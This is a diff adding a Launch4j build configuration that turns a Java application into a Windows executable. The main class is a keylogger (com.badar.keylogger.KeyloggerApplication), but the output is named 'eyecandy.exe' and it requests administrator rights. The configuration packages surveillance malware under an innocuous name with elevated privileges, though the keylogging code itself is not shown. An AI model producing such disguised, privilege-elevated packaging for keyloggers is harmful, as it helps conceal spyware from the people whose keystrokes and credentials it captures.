@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<launch4jConfig>
+    <dontWrapJar>false</dontWrapJar>
+    <headerType>gui</headerType>
+    <jar>target/eyecandy.jar</jar>
+    <outfile>target/eyecandy.exe</outfile>
+    <manifest>
+        <requestedExecutionLevel>requireAdministrator</requestedExecutionLevel>
+        <dpiAware>true</dpiAware>
+    </manifest>
+    <classPath>
+        <mainClass>com.badar.keylogger.KeyloggerApplication</mainClass>
+    </classPath>
+    <jre>
+        <minVersion>17</minVersion>
+    </jre>
+</launch4jConfig>
